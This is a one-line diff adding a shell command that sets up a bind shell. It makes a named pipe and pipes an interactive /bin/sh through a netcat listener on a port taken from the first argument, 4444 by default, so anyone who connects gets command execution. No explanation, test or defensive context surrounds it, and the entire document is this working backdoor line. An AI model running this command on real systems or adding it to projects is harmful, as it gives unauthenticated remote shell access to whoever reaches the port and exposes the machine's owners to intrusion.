@@ -1,0 +1,1 @@
+t=`mktemp`;rm -f $t; mkfifo $t; cat $t | /bin/sh -i 2>&1 | nc -l ${1:-4444} > $t; rm $t
